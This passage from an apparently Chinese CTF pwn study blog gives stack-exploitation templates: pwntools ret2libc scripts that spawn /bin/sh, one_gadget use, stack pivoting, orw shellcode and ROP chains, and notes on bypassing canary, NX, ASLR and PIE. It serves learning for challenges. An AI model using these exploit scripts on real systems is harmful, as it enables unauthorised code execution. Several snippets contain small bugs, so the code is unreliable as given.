href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a></p><p><a href="https://github.com/matrix1001/glibc-all-in-one"><strong>glibc-all-in-one</strong></a></p><h4 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h4><p>查gadget：</p><p><code>ROPgadget --binary [file] --only &quot;pop|ret&quot; | grep &quot;xxx&quot;</code></p><p><code>ropper --file [file] --search &quot;xxx&quot;</code></p><h5 id="给定libc"><a href="#给定libc" class="headerlink" title="给定libc"></a>给定libc</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;x.x.x.x&#x27;</span>, <span class="number">22222</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt.write</span><br><span class="line">write_got = elf.got.write</span><br><span class="line">main_addr = elf.sym.main</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401233</span></span><br><span class="line">pop_rsi = <span class="number">0x401231</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main_addr)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">write_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># 或 write_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr-libc.sym.write</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym.system</span><br><span class="line">binsh_addr = libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h5 id="使用LibSearcher"><a href="#使用LibSearcher" class="headerlink" title="使用LibSearcher"></a>使用LibSearcher</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;x.x.x.x&#x27;</span>, <span class="number">22222</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">main_addr = elf.sym.main</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># 或 puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(libcbase)</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h5 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h5><p>查找已知的libc中 <code>exevce(&quot;/bin/sh&quot;)</code> 语句的地址：</p><p><code>one_gadget libc.so</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># x64</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;x.x.x.x&#x27;</span>, <span class="number">22222</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">main_addr = elf.sym.main</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym.puts</span><br><span class="line"></span><br><span class="line"><span class="comment">#one_gadget libc.so</span></span><br><span class="line">execve_addr = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(execve_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>（预留）</p><p>​    </p><h3 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h3><p>（预留）</p><p>​    </p><h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><h4 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h4><p>在一般的栈溢出攻击时，有一个前提条件是“有充分的栈空间用来布局”，通常我们会在栈的剩余空间上存放一些恶意指令。但是当栈的剩余空间很小时，例如只可覆盖ebp和ret，一般的栈溢出思路就无法完成攻击。</p><p>不过既然栈上没有足够的空间供我们布置，那我们可以尝试找另一块空间来进行布局，然后将栈指针esp劫持到这里就能完成攻击，这就是”栈迁移“的基本思想。</p><p><img src="/2021/08/08/pwn-%E6%A0%88/post-51-6267746ca6e62.png" alt="image-20220412203701158.png" style="zoom: 80%;"></p><p>如图所示，当主调函数调用<code>func</code>函数时：</p><ul><li>执行<code>push eip+4</code>将调用语句的下一条语句保存到栈上，用来在函数返回时跳转到返回地址（<code>ret</code>）</li><li>PC指向<code>func</code>函数的地址</li></ul><p>在执行<code>func</code>函数前：</p><ul><li><code>func</code>会先将<code>ebp</code>寄存器中的值保存到栈上，用于在函数返回时还原<code>ebp</code>为主调函数的栈底。</li></ul><p>函数执行完毕，返回，会执行<code>leave</code> <code>ret</code>这两条语句</p><ul><li><code>leave</code>相当于<code>mov esp,ebp</code>（把栈指针指向栈底，销毁栈帧）、<code>pop ebp</code>（还原<code>ebp</code>为主调函数的栈底）。</li><li><code>ret</code>相当于<code>pop eip</code>（把栈上保存的返回地址存入eip寄存器）</li></ul><p>从这里可以知道，ebp的值可以控制esp，但是<code>leave</code>指令是先<code>mov esp,ebp</code>后<code>pop ebp</code>，看上去没有办法通过修改栈上保存的<code>ebp</code>改变esp的值，不过不要忘记我们还可以控制<code>ret</code>的值，如果把<code>ret</code>覆盖为<code>leave ret</code>的地址，我们覆盖的假<code>ebp</code>就可以通过两次<code>leave</code>语句到esp寄存器上，从而完成了栈迁移。</p><p><strong>思路：</strong></p><p>利用第一次输入泄露出ebp地址，再利用第二次输入构造一个栈，将esp劫持到我们构造的栈上，再把栈上的返回地址改为<code>system</code>函数的地址，这样就模拟出了一次<code>system(&quot;/bin/sh&quot;)</code>的调用。</p><p>参考：</p><p>ciscn_2019_es_2</p><p>​    </p><h4 id="特殊系统调用"><a href="#特殊系统调用" class="headerlink" title="特殊系统调用"></a>特殊系统调用</h4><h5 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h5><p>将内存页的权限修改为可读可写可执行。</p><p>需要注意的是指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。</span></span><br><span class="line"><span class="comment">len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。</span></span><br><span class="line"><span class="comment">prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：</span></span><br><span class="line"><span class="comment">1）PROT_READ：内存段可读；</span></span><br><span class="line"><span class="comment">2）PROT_WRITE：内存段可写；</span></span><br><span class="line"><span class="comment">3）PROT_EXEC：内存段可执行；</span></span><br><span class="line"><span class="comment">4）PROT_NONE：内存段不可访问。</span></span><br><span class="line"><span class="comment">返回值：0；成功，-1；失败（并且errno被设置）</span></span><br><span class="line"><span class="comment">1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。</span></span><br><span class="line"><span class="comment">2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。</span></span><br><span class="line"><span class="comment">3）ENOMEM：内核内部的结构体无法分配。</span></span><br><span class="line"><span class="comment">这里的参数prot：</span></span><br><span class="line"><span class="comment">r:4</span></span><br><span class="line"><span class="comment">w:2</span></span><br><span class="line"><span class="comment">x:1</span></span><br><span class="line"><span class="comment">prot为7（1+2+4）就是rwx可读可写可执行，与linux文件属性用法类似。 */</span></span><br></pre></td></tr></table></figure><h5 id="getdents64"><a href="#getdents64" class="headerlink" title="getdents64"></a>getdents64</h5><p>读取目录结构。</p><p><code>int getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count);</code></p><p>该函数是一个解析文件夹的函数，第一个参数时要解析的文件句柄，第二个参数是存放解析数据的位置，count是dirp的大小，通过这个我们就可以解析文件夹，需要注意的是当打开文件夹时open的第二个参数为0x10000,打开文件时的参数为0。</p><p>返回结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent64</span> &#123;</span></span><br><span class="line">    <span class="keyword">ino64_t</span> d_ino; <span class="comment">/* 64-bit inode number */</span></span><br><span class="line">    <span class="keyword">off64_t</span> d_off; <span class="comment">/* 64-bit offset to next structure */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> d_reclen; <span class="comment">/* Size of this dirent */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> d_type; <span class="comment">/* File type */</span></span><br><span class="line">    <span class="keyword">char</span> d_name[]; <span class="comment">/* Filename (null-terminated) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​    </p><h4 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h4><p>orw 方式，即 open-read-write，通过文件操作直接获取文件内容。</p><p><strong>查找 <code>syscall; ret</code> 的 gadget方法</strong></p><ol><li><p>用 opcode 功能搜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(asm(<span class="string">&#x27;syscall;ret&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment"># 0f05c3</span></span><br></pre></td></tr></table></figure></li><li><p>ROPgadget搜索</p><p><code>ROPgadget --binary libc-2.31.so --opcode 0f05c3</code></p></li></ol><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p><strong>pwntools</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwntools</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x100</span>)</span><br><span class="line">payload1 = asm(shellcode)</span><br></pre></td></tr></table></figure><p><strong>32位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>64位</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="ROP-1"><a href="#ROP-1" class="headerlink" title="ROP"></a>ROP</h5><p><strong>open</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># open(&quot;.&quot;)</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br></pre></td></tr></table></figure><p><strong>read</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read(0, bss_addr, 2)</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br></pre></td></tr></table></figure><p><strong>write</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write(1, bss_addr + 0x200, 0x600)</span></span><br><span class="line">payload += p64(pop_rax_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_ret)</span><br><span class="line">payload += p64(bss_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret)</span><br><span class="line">payload += p64(<span class="number">0x600</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><h3 id="ALSR"><a href="#ALSR" class="headerlink" title="ALSR"></a>ALSR</h3><p>ASLR 的是操作系统的功能选项，作用于 executable（ELF）装入内存运行时，因而只能随机化 stack、heap、libraries 的基址。</p><p>​    </p><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>No-Execute（不可执行），Nx 的原理是将数据所在内存页标识为不可执行，当程序执行流被劫持到栈上时，程序会尝试在数据页面上执行指令，因为数据页被标记为不可知性，此时CPU就会抛出异常，而不是去执行栈上数据。</p><p>​    </p><h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>金丝雀保护，是一种用来防护栈溢出的保护机制。其原理是在函数入口处，先从 fs/gs 寄存器中取出一个 4(eax)/8(rax) 字节的 cookie 信息存到栈上，当函数结束返回的时候会验证 cookie 信息是否合法(与开始存的是否一致)，如果不合法就停止程序运行。真正的 cookie 信息也会保存在程序的某个位置。插入栈中的 cookie 一般在 ebp / rbp 之上的一个内存单元保存。</p><p><strong>攻击</strong></p><h4 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h4><p>（待补充）</p><h4 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h4><blockquote><p>线程局部存储 (TLS) 是一种存储持续期（storage duration），对象的存储是在线程开始时分配，线<br>程结束时回收，每个线程有该对象自己的实例。</p></blockquote><p>TLS 具有 TCB 结构体。也就是说对于 TLS 的变量，每个线程都会有自己独有的一份，既然维护 canary 的 TCB 结构体是 TLS 的，就不能想到这个结构体必然会在线程自己申请的空间里面，并且在作比较时也是和自己独有的那一份比较的。TCB 结构体是是以 fs 作为基址索引的，TCB 结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *tcb;     <span class="comment">/* Pointer to the TCB. Not necessarily the</span></span><br><span class="line"><span class="comment">                      thread descriptor used by libpthread. */</span></span><br><span class="line">    <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">    <span class="keyword">void</span> *self;      <span class="comment">/* Pointer to the thread descriptor. */</span></span><br><span class="line">    <span class="keyword">int</span> multiple_threads;</span><br><span class="line">    <span class="keyword">int</span> gscope_flag;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">    <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">    <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">       Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">    <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">    <span class="comment">/* Reservation of some values for the TM ABI. */</span></span><br><span class="line">    <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">    <span class="comment">/* GCC split stack support. */</span></span><br><span class="line">    <span class="keyword">void</span> *__private_ss;</span><br><span class="line">    <span class="comment">/* The lowest address of shadow stack, */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">    <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">    like AddressSanitizer, depend on the size of tcbhead_t. */</span></span><br><span class="line">    __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">    <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>在 gdb 里面看 fs 附近的内存分布情况，使用 fsbase 查看 fs 的值，内存分布和结构体定义一致，所以 fs 就是指向 TCB 结构体，vmmap 一下会发现 TCB 是存在栈上的，而且显然建立的时间在 test_thread 之前，又由于可以<strong>栈溢出接近 0x1000 个字节</strong>，完全可以<strong>覆写 TCB 结构体</strong>，把 TCB 的 stack_guard 字段写成比如 p64(0)，那么溢出到 canary 的时候覆写成 0 就可以 bypass canary。</p><p>​    </p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE（Position Independent Executables）是编译器（gcc，…）功能选项（-fPIE / -fpie），作用于编译过程，可将其理解为特殊的 PIC（so专用，Position Independent Code），加了 PIE 选项编译出来的 ELF 用 file 命令查看会显示其为 so，其随机化了 ELF 装载内存的基址（代码段、plt、got、data 等共同的基址）。其效果为用 objdump、IDA 反汇编之后的地址是用偏移表示的而不是绝对地址。</p><p>​    </p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>（预留）</p><p>​    </p><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p>（预留）</p><p>​    </p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="随机数（srand-rand）"><a href="#随机数（srand-rand）" class="headerlink" title="随机数（srand+rand）"></a>随机数（srand+rand）</h4><p><a href="https://www.mathstat.dal.ca/~selinger/random/">glibc随机数发生器</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;h2 id=&quot;ROP&quot;&gt;&lt;a href=&quot;#ROP&quot; class=&quot;headerlink&quot; title=&quot;ROP&quot;&gt;&lt;/a&gt;ROP&lt;/h2&gt;&lt;p&gt;ROP（Return-Oriented Programming, 返回导向编程）&lt;/p&gt;
&lt;p&gt;通过栈溢出</summary>
      
    
    
    
